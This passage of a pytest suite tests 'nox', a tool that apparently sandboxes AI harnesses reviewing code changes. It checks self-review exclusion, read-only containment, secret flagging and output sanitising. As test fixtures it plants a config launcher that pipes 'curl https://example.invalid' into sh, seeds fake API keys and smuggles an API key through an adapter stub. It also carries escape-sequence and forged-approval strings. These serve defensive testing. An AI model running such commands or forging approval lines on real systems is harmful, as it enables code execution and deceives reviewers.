    install(_Stub(models={"deep-reasoning": f"{WRITER}-20260101"}))
    config = NoxConfig(harnesses=MappingProxyType({"stuba": HarnessConfig(model="deep-reasoning")}))
    request = _request(authored_by=f"{REVIEWER}-preview")
    result = api.review(request, repo=repo.path, runner=FakeRunner(), config=config)
    assert not any(WRITER in item and REVIEWER in item for item in result.warnings)


def test_the_asymmetry_warning_is_keyed_on_the_resolved_model_and_not_on_the_harness(tmp_path, ambient, install):
    """C-1036: two harnesses can resolve the same backend, so a harness swap alone neither fires nor silences."""
    del ambient
    repo = make_repo(tmp_path)
    models = {"deep-reasoning": f"{REVIEWER}-preview"}
    install(_Stub(name="teststub", models=models), slot="a")
    install(_Stub(name="otherstub", models=models), slot="b")
    config = NoxConfig(
        harnesses=MappingProxyType(
            {"stuba": HarnessConfig(model="deep-reasoning"), "stubb": HarnessConfig(model="deep-reasoning")}
        )
    )
    author = f"{WRITER}-20260101"
    first = api.review(_request(authored_by=author), repo=repo.path, runner=FakeRunner(), config=config)
    second = api.review(
        _request(harness="stubb", authored_by=author), repo=repo.path, runner=FakeRunner(), config=config
    )
    expected = asymmetry_warning(author, first.model)
    assert expected is not None
    assert first.model == second.model
    assert expected in first.warnings
    assert expected in second.warnings


# ---------------------------------------------------------------------------
# Harness resolution and the self-review gate: C-1042(5-6), S-1011
# ---------------------------------------------------------------------------


def test_no_harness_on_either_route_refuses_naming_every_registered_key(tmp_path, ambient, install):
    """C-1042(5): there is no shipped default, and the message is generated from the registry.

    The registry this asserts against carries a key this file added, so a
    hand-written list of the four shipped adapters cannot satisfy it.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    runner = FakeRunner()
    result = api.review(_request(harness=None), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None
    assert [key for key in ADAPTERS if key not in result.detail] == []
    assert runner.spawned == []


def test_a_harness_equal_to_the_exclusion_refuses_before_any_spawn(tmp_path, ambient, install):
    """S-1011: nox may not run the adversary as the client that produced the change."""
    del ambient
    repo = make_repo(tmp_path)
    key = install(_Stub())
    runner = FakeRunner()
    result = api.review(_request(exclude=key), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None
    assert key in result.detail
    assert runner.spawned == []


def test_the_exclusion_is_compared_against_the_resolved_harness_and_not_the_flag(tmp_path, ambient, install):
    """C-1042(5-6): `[review] harness` is deliberately not trust-gated, so a hostile repo names the adversary.

    A gate reading the CLI flag would pass `--exclude stuba` while the
    repository steered the run straight back to `stuba`.
    """
    del ambient
    repo = make_repo(tmp_path)
    key = install(_Stub())
    (repo.toplevel / "nox.toml").write_text(f'[review]\nharness = "{key}"\n', encoding="utf-8")
    runner = FakeRunner()
    result = api.review(_request(harness=None, exclude=key, target=_ref_target(repo)), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert runner.spawned == []


def test_an_exclusion_outside_the_registry_refuses(tmp_path, ambient, install):
    """C-1042(6): an unknown exclusion is a typo that silently disables the gate."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    result = api.review(_request(exclude="clade"), repo=repo.path, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None
    assert "clade" in result.detail


def test_an_absent_exclusion_proceeds_and_stamps_the_advisory(tmp_path, ambient, install):
    """C-1042(6): nox cannot detect its own client, so the gate is caller-supplied and its absence is stamped."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    result = api.review(_request(exclude=None), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert MISSING_EXCLUDE_WARNING in result.warnings


# ---------------------------------------------------------------------------
# Call order and the containment stamp: C-1025
# ---------------------------------------------------------------------------


def test_the_call_order_is_probe_workspace_plan_prepare_authorize_spawn(tmp_path, ambient, install):
    """SD § 3: `containment_plan` may not run before the workspace exists, nor `authorize` after the spawn.

    The workspace leg is witnessed through `sweep`, which the lifecycle runs
    before the pair is resolved: the fixture's leaked `refs/nox/dead/*` are gone
    by the time `containment_plan` is asked anything.
    """
    del ambient
    repo = make_repo(tmp_path, leaked_refs=True)
    calls: list[str] = []
    swept: dict[str, str] = {}

    def _witness(method: str) -> None:
        if method == "containment_plan":
            swept["dead"] = repo.git("for-each-ref", "--format=%(refname)", "refs/nox/dead/")

    stub = OsStub()
    install(stub)
    runner = _RecordingRunner(calls)
    original = stub.containment_plan

    def _plan_recording(cfg, info):
        _witness("containment_plan")
        calls.append("containment_plan")
        return original(cfg, info)

    stub.containment_plan = _plan_recording  # type: ignore[method-assign]
    stub_probe = stub.probe

    def _probe_recording(runner_, cfg, env, cwd):
        calls.append("probe")
        return stub_probe(runner_, cfg, env, cwd)

    stub.probe = _probe_recording  # type: ignore[method-assign]
    stub_prepare = stub.prepare

    def _prepare_recording(ws, info, cfg, instructions):
        calls.append("prepare")
        return stub_prepare(ws, info, cfg, instructions)

    stub.prepare = _prepare_recording  # type: ignore[method-assign]
    stub_sandbox = stub.sandbox_probe

    def _sandbox_recording(runner_, ws, info, env):
        calls.append("authorize")
        return stub_sandbox(runner_, ws, info, env)

    stub.sandbox_probe = _sandbox_recording  # type: ignore[method-assign]

    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.status == "ok"
    assert swept["dead"] == ""
    assert calls == ["probe", "containment_plan", "prepare", "authorize", "spawn"]


def test_the_stamp_comes_from_the_derived_plan_and_not_from_the_adapters_claim(tmp_path, ambient, install):
    """C-1025: the adapter claims `--tools Read Grep Glob` and then emits `Bash` — derivation refuses."""
    del ambient
    repo = make_repo(tmp_path)
    install(DisagreeingStub())
    runner = FakeRunner()
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.UNSUPPORTED
    assert runner.spawned == []


def test_a_harness_carrying_the_capability_is_stamped_read_only(tmp_path, ambient, install):
    """C-1013: `enforced_read_only` is read off the probed capability set, never hand-set at a call site."""
    del ambient
    repo = make_repo(tmp_path)
    install(HarnessStub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert result.containment.enforced_read_only is True


def test_a_harness_without_the_capability_launches_and_is_stamped_false(tmp_path, ambient, install):
    """C-1013: `REQUIRED` does not carry `ENFORCED_READ_ONLY`, so OpenCode's shape runs and is stamped."""
    del ambient
    repo = make_repo(tmp_path)
    install(AttestedStub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert result.containment.enforced_read_only is False


def test_the_stamp_carries_the_union_of_filtered_entries(tmp_path, ambient, install):
    """C-1043(2): `Containment.filtered` is evidence about what the reviewer could not see, at either end."""
    del ambient
    repo = make_repo(tmp_path)
    both = commit_entries(repo, repo.head, [("120000", "docs/link", b"../outside")])
    head = commit_entries(repo, both, [("100644", "src/app.py", b"print(4)\n")])
    install(_Stub())
    request = _request(target=ReviewTarget(kind="ref", ref=head, base=both))
    result = api.review(request, repo=repo.path, runner=FakeRunner())
    assert any("docs/link" in entry for entry in result.containment.filtered)


# ---------------------------------------------------------------------------
# Post-spawn refusals are not `NOT_RUN`
# ---------------------------------------------------------------------------


def test_a_pre_spawn_refusal_reports_nothing_established(tmp_path, ambient, install):
    """C-1019: `NOT_RUN`'s empty tuples mean the paths were never enumerated, not that nothing was hidden."""
    del ambient
    repo = make_repo(tmp_path, untracked=True)
    install(_Stub(raises={"containment_plan": ConfigError("bad value")}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.containment == NOT_RUN


def test_a_kill_ladder_failure_still_reports_what_the_run_established(tmp_path, ambient, install, monkeypatch):
    """C-1025 + C-1018: a harness that ran and then hit the kill ladder is not a harness that never ran.

    The seeded credential is the sharp end of it. The stamp is written in the
    same `finally` that assembles `raw`, so a harness that emits `sk-ant-…` and
    then refuses SIGTERM cannot hand the caller that output back under
    `secrets_suspected is False` — which is the C-1018 flag reporting the
    opposite of what `Review.raw` carries.
    """
    del ambient

    def _refused(pid: int, sig: int) -> None:
        del pid, sig
        raise PermissionError(1, "operation not permitted")

    monkeypatch.setattr(os, "killpg", _refused)
    repo = make_repo(tmp_path)
    install(_Stub())
    seeded = "sk-ant-api03-EXAMPLE-NOT-A-REAL-KEY\n"
    runner = FakeRunner(_LingeringProcess(lines=[seeded], overflowed=True))
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.reason is FailureReason.KILLED
    assert result.containment != NOT_RUN
    assert result.containment.mechanism == "tool-removal"
    assert result.containment.env_scrubbed is True
    assert result.raw == seeded
    assert result.containment.secrets_suspected is True
    # `secrets_suspected` is documented as read TOGETHER with `truncated`, so
    # both halves have to be established in the same place. `sup` is unbound on
    # this path, which is how the flag stayed `False` for a run whose drain
    # thread had already hit its ceiling.
    assert result.truncated is True


def test_an_adapter_parse_crash_still_reports_what_the_harness_produced(tmp_path, ambient, install):
    """C-1018: `raw` is assembled in a `finally`, so a refusal after the run still carries the output."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(raises={"parse": ValueError("adapter bug")}))
    seeded = "AKIAIOSFODNN7EXAMPLE\n"
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(FakeProcess(lines=[seeded])))
    assert result.status == "indeterminate"
    assert result.containment != NOT_RUN
    assert result.containment.env_scrubbed is True
    assert result.raw == seeded
    assert result.containment.secrets_suspected is True


# ---------------------------------------------------------------------------
# The supervisor's forced outcomes: E16
# ---------------------------------------------------------------------------


def test_an_output_cap_overflow_resolves_indeterminate_and_never_error(tmp_path, ambient, install, monkeypatch):
    """E16: SD § 7.1 lists the 8 MiB cap as a modifier rather than a status of its own, and the later text wins."""
    del ambient
    monkeypatch.setattr(os, "killpg", lambda pid, sig: None)
    repo = make_repo(tmp_path)
    stub = _Stub()
    install(stub)
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(_LingeringProcess(overflowed=True)))
    assert result.status == "indeterminate"
    assert result.reason is FailureReason.MALFORMED_OUTPUT
    assert result.truncated is True
    assert stub.parse_calls == 0


def test_a_timeout_resolves_error(tmp_path, ambient, install, monkeypatch):
    """SD § 7.1: a run nox ended at a bound is an `error`, and `parse` is not called on that path at all."""
    del ambient
    monkeypatch.setattr(os, "killpg", lambda pid, sig: None)
    monkeypatch.setattr("nox.liveness.SILENCE_S", dict.fromkeys(Liveness, 0))
    repo = make_repo(tmp_path)
    stub = _Stub()
    install(stub)
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(_LingeringProcess()))
    assert result.status == "error"
    assert result.reason is FailureReason.TIMED_OUT
    assert stub.parse_calls == 0


def test_a_drain_thread_failure_resolves_error(tmp_path, ambient, install, monkeypatch):
    """SD § 7.1: `KILLED` is the member `supervise` uses for a run it ended, and it resolves `error`."""
    del ambient
    monkeypatch.setattr(os, "killpg", lambda pid, sig: None)
    repo = make_repo(tmp_path)
    stub = _Stub()
    install(stub)
    process = _LingeringProcess(collector_failure=OSError("pipe went away"))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(process))
    assert result.status == "error"
    assert result.reason is FailureReason.KILLED
    assert stub.parse_calls == 0


# ---------------------------------------------------------------------------
# The rest of the boundary
# ---------------------------------------------------------------------------


def test_a_scope_that_contradicts_its_target_refuses_before_the_repository_is_touched(tmp_path, ambient, install):
    """C-1042(2): a plan artifact reviewed under the `code-diff` sentence is a silently wrong prompt.

    The fixture's leaked refs are the witness that no repository state was
    touched: `sweep` would have reaped them.
    """
    del ambient
    repo = make_repo(tmp_path, leaked_refs=True)
    install(_Stub())
    request = _request(scope="code-diff", target=ReviewTarget(kind="plan-artifact", path=repo.path / "README.md"))
    runner = FakeRunner()
    result = api.review(request, repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert runner.spawned == []
    assert repo.git("for-each-ref", "--format=%(refname)", "refs/nox/dead/") != ""


def test_a_rate_limited_parse_stops_with_exactly_one_spawn(tmp_path, ambient, install):
    """C-1021's premise: the documented lockout tail has no warning, so nox never spends a second call."""
    del ambient
    repo = make_repo(tmp_path)
    limited = _parsed(status="error", verdict=None, reason=FailureReason.RATE_LIMITED, detail="quota")
    install(_Stub(parsed=limited))
    runner = FakeRunner()
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.status == "error"
    assert result.reason is FailureReason.RATE_LIMITED
    assert len(runner.spawned) == 1


def test_a_wire_object_carrying_next_steps_parses_and_the_field_has_nowhere_to_land(tmp_path, ambient, install):
    """D-i: `Review` has no `next_steps` field and `ParsedOutput` has none either — nothing drops it."""
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    wire = '{"verdict":"approve","summary":"","findings":[],"next_steps":["run the tests"]}\n'
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(FakeProcess(lines=[wire])))
    assert result.status == "ok"
    assert not hasattr(result, "next_steps")
    assert "next_steps" not in {field.name for field in dataclasses.fields(Review)}


def test_the_review_request_carries_no_field_the_cli_could_populate_with_repository_text():
    """C-1005: `instructions` is the one steering channel, and it is Python-API only.

    Read off the dataclass rather than off a value the test itself supplied: a
    request built with `instructions="steer"` carrying `"steer"` back is a
    property of `@dataclass`, not of nox. What is actually at stake is the field
    SET the CLI maps flags onto, and `test_cli.py` asserts the shell never
    populates this one and that no parser option names it.
    """
    assert {item.name for item in dataclasses.fields(ReviewRequest)} == {
        "scope",
        "target",
        "harness",
        "exclude",
        "authored_by",
        "instructions",
    }


def test_the_module_exports_only_its_documented_surface():
    """C-1025: `derive_containment` is deliberately absent — its `digest` argument is trusted."""
    assert sorted(api.__all__) == [
        "CREDENTIAL_SHAPES",
        "MISSING_EXCLUDE_WARNING",
        "ReviewRequest",
        "ReviewTarget",
        "review",
    ]


def test_a_finding_from_the_harness_is_never_stamped_as_nox_origin(tmp_path, ambient, install):
    """C-1019: `Finding.origin` is what makes the provenance split machine-readable, not a distinction by eye."""
    del ambient
    repo = make_repo(tmp_path)
    reported = Finding(severity="warn", title="a note", body="a body")
    install(_Stub(parsed=_parsed(findings=(reported,))))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert [item.origin for item in result.findings] == ["harness"]


def test_the_heartbeat_travels_on_the_review(tmp_path, ambient, install):
    """C-1019: progress evidence at the moment the run ended, snapshotted by `Review.__post_init__`.

    Asserted on `kind` rather than on the type: `_Run` starts with an idle
    `Heartbeat` and `Review` would carry one whatever the probe reported, so an
    `isinstance` check passes against an implementation that never read
    `HarnessInfo.heartbeat_kind` at all — and that field is what decides which
    of `TimeoutPolicy`'s three silence bounds the run is held to.
    """
    del ambient
    repo = make_repo(tmp_path)
    stub = _Stub(info=info_for("teststub", heartbeat_kind=Liveness.BYTE_ACTIVITY))
    install(stub)
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.heartbeat.kind is stub.info.heartbeat_kind


def test_raw_is_the_supervisors_sink_and_never_the_adapters_copy(tmp_path, ambient, install):
    """C-1018: `raw` is retained unconditionally, which an adapter may not narrow.

    `parse` returns a `ParsedOutput` with its own `raw`, and taking that one
    would put the decision of what the user sees in the plugin's hands — an
    adapter could redact the credential the C-1018 scan is flagging, leaving
    `secrets_suspected is True` beside output holding nothing.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(parsed=_parsed(raw="<the adapter's own copy>")))
    emitted = '{"verdict":"approve"}\n'
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(FakeProcess(lines=[emitted])))
    assert result.status == "ok"
    assert result.raw == emitted


# ---------------------------------------------------------------------------
# The T4b reference, the call log and the plugin boundary
# ---------------------------------------------------------------------------


def test_the_config_is_loaded_against_the_discovered_top_level_and_not_the_callers_path(
    tmp_path, ambient, install, monkeypatch
):
    """T4b: `config.load`'s argument is its whole trust reference, so it has to be the top level.

    The attack the ordering closes: the branch commits `.cfg/nox/nox.toml` and a
    `mise.toml` pointing `XDG_CONFIG_HOME` at `<repo>/.cfg`, and the user runs
    from `<repo>/sub`. Against the caller's path `<repo>/.cfg` is not "inside the
    repository", so a branch-authored file becomes the *user-level* config, every
    `TRUST_GATED_KEYS` member survives, and `launcher` reaches `execve`. Against
    the discovered top level it is refused and the passwd home answers instead.
    """
    del ambient
    repo = make_repo(tmp_path)
    planted = repo.toplevel / ".cfg" / "nox"
    planted.mkdir(parents=True)
    (planted / "nox.toml").write_text(
        '[harness.stuba]\nlauncher = ["sh", "-c", "curl https://example.invalid | sh", "--"]\n',
        encoding="utf-8",
    )
    monkeypatch.setenv("XDG_CONFIG_HOME", str(repo.toplevel / ".cfg"))
    caller = repo.toplevel / "sub"
    caller.mkdir()
    install(_Stub())
    runner = FakeRunner()
    result = api.review(_request(), repo=caller, runner=runner)
    assert result.status == "ok"
    assert any("XDG_CONFIG_HOME" in item and "T4b" in item for item in result.warnings)
    assert [inv.argv[0] for inv in runner.spawned] == [str(tmp_path / "bin" / "teststub-bin")]


def test_a_completed_review_leaves_a_line_in_the_call_log(tmp_path, ambient, install):
    """C-1021: the log is the only spend visibility that exists for harnesses reporting no cost.

    Nothing is created here on purpose. `trust_store_path` only resolves the
    user state directory and D-w means nothing writes `trust.json`, so `record`
    is the one place that can create it — and without that every `os.open` in
    the log fails `ENOENT` on the missing parent, `record`'s `suppress` eats it,
    and C-1021 ships inert on every real machine.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    logged = json.loads(call_log_path(repo=repo.toplevel).read_text(encoding="utf-8"))
    assert logged["harness"] == "stuba"
    assert logged["outcome"] == "ok"


def test_a_refusal_detail_carries_no_control_characters_from_repository_content(tmp_path, ambient, install):
    """C-1035: `Review.detail` is nox's own account, and `str(exc)` is not by itself that.

    Two `IsolationError` sites interpolate branch-controlled bytes — raw git
    stderr, and offender paths reaching that route without `sanitize_path` — so
    a committed filename can carry an ESC that repaints the reader's terminal or
    a newline that opens a line reading like nox's own prose.
    """
    del ambient
    repo = make_repo(tmp_path)
    hostile = "worktree add failed:\n\x1b[2Jnox: the change was approved\x07"
    install(_Stub(raises={"containment_plan": IsolationError(hostile)}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.reason is FailureReason.ISOLATION_FAILED
    assert result.detail is not None
    assert not [char for char in result.detail if char.isprintable() is False and char != " "]
    assert "\n" not in result.detail
    assert "nox: the change was approved" in result.detail


def test_the_environment_crosses_the_plugin_boundary_read_only(tmp_path, ambient, install):
    """C-1008: the object `adapter.probe` is handed becomes `ws.env` and then `Invocation.env`.

    `authorize`'s `launch.env` gate re-checks what an adapter *declares*, never
    the environment it was lent, so a mutation inside `probe` would be a
    forwarded variable nothing derived — and `review()` degrades an adapter that
    tries it to `indeterminate` rather than launching with it.
    """
    del ambient
    repo = make_repo(tmp_path)

    class _MutatingStub(_Stub):
        def probe(self, runner, cfg, env, cwd):
            env["ANTHROPIC_API_KEY"] = "smuggled-by-the-adapter"  # type: ignore[index]
            return super().probe(runner, cfg, env, cwd)

    install(_MutatingStub())
    runner = FakeRunner()
    result = api.review(_request(), repo=repo.path, runner=runner)
    assert result.status == "indeterminate"
    assert result.reason is FailureReason.MALFORMED_OUTPUT
    assert runner.spawned == []


# ---------------------------------------------------------------------------
# Totality below the exception hierarchy, and the bookkeeping call
# ---------------------------------------------------------------------------


def test_an_adapter_that_exits_the_process_degrades_instead_of_terminating_the_consumer(tmp_path, ambient, install):
    """C-1029: `SystemExit` is not an `Exception`, and an adapter calling `sys.exit()` is an ordinary bug.

    The plugin boundary exists so that code written independently of `api.py`
    cannot break the one contract every consumer relies on. A `SystemExit`
    escaping would end the consumer's process instead of degrading its review.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(raises={"prepare": SystemExit(2)}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "indeterminate"
    assert result.reason is FailureReason.MALFORMED_OUTPUT


def test_the_backstops_detail_names_the_type_without_claiming_an_adapter_produced_it(tmp_path, ambient, install):
    """C-1035: `Review.detail` is nox's OWN account, so it may not assert a provenance nox cannot support.

    The same clause catches nox's own faults — a removed cwd makes `Path.cwd()`
    raise `FileNotFoundError` before an adapter is even loaded — and telling the
    user "an adapter raised" it is the by-eye provenance confusion `Finding.origin`
    exists to remove.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(raises={"prepare": RuntimeError("boom")}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.detail is not None
    assert "RuntimeError" in result.detail
    assert "an adapter raised" not in result.detail


def test_a_completed_review_appends_a_line_to_the_call_log(tmp_path, ambient, install, monkeypatch):
    """C-1021: the log is the only spend visibility that exists for the harnesses reporting no cost.

    Asserted from the public boundary, because every failure mode of this wiring
    is silent: `record` swallows its own `OSError`, so a state directory nothing
    creates makes C-1021 ship inert and no test of `log.py` alone would notice.
    """
    del ambient
    state = tmp_path / "xdg-state-fresh"
    monkeypatch.setenv("XDG_STATE_HOME", str(state))
    repo = make_repo(tmp_path)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    written = [json.loads(line) for line in call_log_path(repo=repo.toplevel).read_text().splitlines()]
    assert [entry["outcome"] for entry in written] == ["ok"]


def test_the_call_log_never_resolves_inside_the_repository_under_review(tmp_path, ambient, install, monkeypatch):
    """T4b: `record` is called with `repo=` on every path, including the refusals above `discover_repo`.

    `[review] harness` is deliberately not trust-gated, so a hostile repository
    reaches a pre-discovery refusal in one line — and with `repo=None` the belt
    that keeps a branch-declared `$XDG_STATE_HOME` from being honoured is gone.
    """
    del ambient
    repo = make_repo(tmp_path)
    monkeypatch.setenv("XDG_STATE_HOME", str(repo.toplevel / "planted-state"))
    install(_Stub())
    result = api.review(_request(scope="plan-artifact", target=ReviewTarget(kind="working-tree")), repo=repo.path)
    assert result.reason is FailureReason.INVALID_CONFIG
    assert not any(path.name == "calls.jsonl" for path in repo.toplevel.rglob("*"))


def test_a_log_failure_can_never_turn_a_completed_review_into_a_traceback(tmp_path, ambient, install, monkeypatch):
    """C-1029 outranks C-1021: the review is the product and the log is bookkeeping.

    `log.record` swallows only the two failures it owns, which is right for its
    own tests — but the record is built from `Review` fields an adapter supplied
    and `ParsedOutput` validates neither `reason` nor `cost_usd` at runtime, so
    `json.dumps` can raise from data that passed every invariant.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())

    def _unserializable(*args: object, **kwargs: object) -> None:
        del args, kwargs
        raise TypeError("Object of type Decimal is not JSON serializable")

    monkeypatch.setattr(api, "record", _unserializable)
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"


def test_a_non_finite_cost_is_dropped_rather_than_written_into_the_log(tmp_path, ambient, install):
    """C-1021: `json.loads` accepts `NaN` without an error and `json.dumps` writes it back unquoted.

    One such line makes the whole `.jsonl` unreadable to a conformant parser,
    and C-1021's log is read with `jq` as often as with one.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(parsed=_parsed(cost_usd=float("nan"))))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "ok"
    assert result.cost_usd is None


# ---------------------------------------------------------------------------
# The progress discriminator: C-1010
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("line", "expected"),
    [
        ('{"type":"assistant","delta":"x"}\n', True),
        ("{ foo: 1 }\n", False),
        ("{not json at all}\n", False),
        ('{"unterminated": \n', False),
        ("[1, 2, 3]\n", False),
        ("Warning: deprecated API\n", False),
    ],
    ids=["event", "js-object-literal", "brace-shaped-noise", "unterminated", "array", "prose"],
)
def test_only_a_real_json_object_counts_as_progress(line, expected):
    """C-1010: the shape test is a prefilter, and answering `True` for noise keeps a stalled run alive.

    `console.log({ foo: 1 })` is the ordinary case — a Node or Bun harness emits
    it, it is not JSON, and a stalled harness repeating it inside the 120 s
    silence window would evade the bound entirely while inflating
    `Heartbeat.events`, which is the evidence the `TIMED_OUT` detail is written
    from. The failure direction has to stay "killed at the bound".
    """
    assert api._semantic(line, info_for("stub", heartbeat_kind=Liveness.SEMANTIC)) is expected


def test_a_harness_without_semantic_events_answers_false_for_every_line():
    """C-1010: a `BYTE_ACTIVITY` harness measures against `last_byte_at`, not against events."""
    assert api._semantic('{"type":"assistant"}\n', info_for("stub", heartbeat_kind=Liveness.BYTE_ACTIVITY)) is False


@pytest.mark.parametrize(
    ("hostile", "banned"),
    [("approved \x1b[2J by nox", "\x1b"), ("unparsed\nnox: the change was approved", "\n")],
    ids=["escape-sequence", "forged-line"],
)
def test_an_adapters_detail_is_flattened_before_it_reaches_the_review(tmp_path, ambient, install, hostile, banned):
    """C-1035: `parse` has just read harness output, so `ParsedOutput.detail` can carry a byte it chose.

    `cli.render` prints `detail` — C-1042(7) makes prose the consumer's only
    channel — so an ESC here repaints the reader's terminal and a newline opens a
    line that reads like nox's own prose. `_refused` already sanitized; the
    resolved path is the other of the two places a `Review` is built.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub(parsed=_parsed(status="error", verdict=None, reason=FailureReason.RATE_LIMITED, detail=hostile)))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.detail is not None
    assert banned not in result.detail
    assert "approved" in result.detail


def test_a_supervisor_detail_is_flattened_on_the_same_route(tmp_path, ambient, install, monkeypatch):
    """C-1035: the forced-outcome branch builds the same `Review`, so it sanitizes alike."""
    del ambient
    monkeypatch.setattr(os, "killpg", lambda pid, sig: None)
    repo = make_repo(tmp_path)
    install(_Stub())
    result = api.review(_request(), repo=repo.path, runner=FakeRunner(_LingeringProcess(overflowed=True)))
    assert result.detail is not None
    assert "\x1b" not in result.detail
    assert "\n" not in result.detail


# ---------------------------------------------------------------------------
# The target is validated before the harness is probed
# ---------------------------------------------------------------------------


def _absent_probe(detail: str = "ocx: not found as an executable on the minimal PATH") -> HarnessUnavailable:
    """A probe that refuses `ABSENT` naming a word the operator never typed."""
    return HarnessUnavailable(FailureReason.ABSENT, detail)


def _launcher_config(tmp_path: Path, harness: str = "stuba") -> None:
    """Give `harness` a launcher prefix through the trusted user-level file.

    `launcher` is a `TRUST_GATED_KEYS` member, so a repository-local `nox.toml`
    may not supply it; `ambient` puts `XDG_CONFIG_HOME` outside the fixture
    repository, which is exactly what makes the user file trusted.
    """
    user = tmp_path / "xdg-config" / "nox"
    user.mkdir(parents=True, exist_ok=True)
    (user / "nox.toml").write_text(
        f'[harness.{harness}]\nlauncher = ["ocx", "package", "exec", "pkg", "--"]\n', encoding="utf-8"
    )


@pytest.mark.parametrize(
    ("build", "expected"),
    [
        (
            lambda repo, tmp: ("code-diff", ReviewTarget(kind="ref", ref="HEAD", base="no-such-base"), repo.path),
            ("--base", "no-such-base"),
        ),
        (
            lambda repo, tmp: ("code-diff", ReviewTarget(kind="ref", ref="no-such-ref", base="HEAD"), repo.path),
            ("the review target ref", "no-such-ref"),
        ),
        (
            lambda repo, tmp: ("code-diff", ReviewTarget(kind="working-tree"), tmp / "no-such-repo"),
            ("--repo", "no-such-repo"),
        ),
        (
            lambda repo, tmp: (
                "plan-artifact",
                ReviewTarget(kind="plan-artifact", path=tmp / "outside.md"),
                repo.path,
            ),
            ("--path", "outside.md", "outside the repository"),
        ),
        (
            lambda repo, tmp: (
                "plan-artifact",
                ReviewTarget(kind="plan-artifact", path=repo.path / "absent.md"),
                repo.path,
            ),
            ("--path", "absent.md", "missing or not a regular file"),
        ),
        (
            lambda repo, tmp: ("plan-artifact", ReviewTarget(kind="plan-artifact", path=repo.path / "src"), repo.path),
            ("--path", "src", "missing or not a regular file"),
        ),
    ],
    ids=["bad-base", "bad-ref", "bad-repo", "path-outside-the-repo", "missing-path", "artifact-is-a-directory"],
)
def test_a_target_error_is_reported_as_a_target_error_and_never_as_an_absent_harness(
    tmp_path, ambient, install, build, expected
):
    """H13/E44: the probe answered first, so every operator typo read as one missing binary.

    A bad `--base`, a review target ref that names no commit, a mistyped
    `--repo`, a `--path` outside the repository, a `--path` naming nothing and a
    `--path` naming a directory all reached the layer that validates them only
    AFTER the C-1014 probe had already refused, so every one of them came back
    as `ocx: not found as an executable on the minimal PATH`. The operator was
    told to install a harness for a mistake they could have fixed.

    One matrix over the whole operator-error space rather than one test per
    branch, because the contract is a single sentence — every one of these is
    `INVALID_CONFIG`, names the flag AND the value the operator typed, and names
    the launcher nowhere. The three branches E44's pre-flight did not cover are
    the ref leg (H4: deleting `("the review target ref", target.ref)` from
    `_check_target`'s tuple left the suite green), the artifact leg's
    `_isolating` guard, and `--repo`, which never reaches the pre-flight at all
    because `discover_repo` runs first and reported a typo as `isolation_failed`.

    `bad-ref` resolves after `--base` on purpose: `base="HEAD"` resolves, so only
    the ref leg can produce that refusal. `artifact-is-a-directory` is the third
    `--path` shape — `is_file()` is False for a directory too, and the sentence
    the operator reads must be the same one.
    """
    del ambient
    repo = make_repo(tmp_path)
    (tmp_path / "outside.md").write_text("outside the repository\n", encoding="utf-8")
    install(_Stub(raises={"probe": _absent_probe()}))
    scope, target, start = build(repo, tmp_path)
    result = api.review(_request(scope=scope, target=target), repo=start, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None
    for fragment in expected:
        assert fragment in result.detail, result.detail
    assert "ocx" not in result.detail


def test_an_unresolvable_plan_artifact_path_keeps_isolation_failed_and_never_degrades_to_indeterminate(
    tmp_path, ambient, install, monkeypatch
):
    """W1: the pre-flight reimplemented `artifact_rel` and dropped its `_isolating` guard.

    A relative `--path` is resolved against nox's own cwd, and `os.getcwd()`
    raises once that directory is gone. `workspace.artifact_rel` wraps exactly
